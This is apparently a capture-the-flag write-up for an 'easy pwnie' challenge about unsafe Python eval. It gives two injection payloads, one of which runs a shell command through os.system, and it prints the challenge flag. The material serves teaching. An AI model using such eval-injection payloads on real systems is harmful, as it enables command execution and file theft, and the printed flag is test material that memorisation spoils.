# easy pwnie

## Description
Can you print the flag?

## Writeup
The challenge is intended to teach the risks of eval. Arbitrary commands can be run if not sanitized properly. For printing the flag use any one:
`open('/flag.txt', 'r').read()`
`__import__('os').system('cat /flag.txt')`

## FLAG
COPS{ur_pwn13_54y5_n31ghhh}
